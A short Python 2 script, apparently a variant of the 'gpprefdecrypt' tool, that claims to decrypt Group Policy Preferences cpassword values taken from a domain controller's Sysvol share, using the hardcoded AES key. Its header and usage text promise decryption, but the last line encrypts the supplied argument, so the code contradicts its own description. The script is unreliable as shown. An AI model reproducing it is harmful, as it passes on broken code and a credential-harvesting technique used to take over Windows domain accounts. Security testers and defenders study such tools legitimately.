#!/usr/bin/python
#
# Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
#
# This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
#

import sys
from Crypto.Cipher import AES
from base64 import b64decode
from base64 import b64encode

if(len(sys.argv) != 2):
  print "Usage: gpprefdecrypt.py <cpassword>"
  sys.exit(0)

# Init the key
# From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
key = """
4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
""".replace(" ","").replace("\n","").decode('hex')

#print "key=",key

BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

iv =  "\x00" * 16

plaintext = sys.argv[1]

# encrypt to password
print b64encode( AES.new(key, AES.MODE_CBC, iv ).encrypt( pad(plaintext) ) )






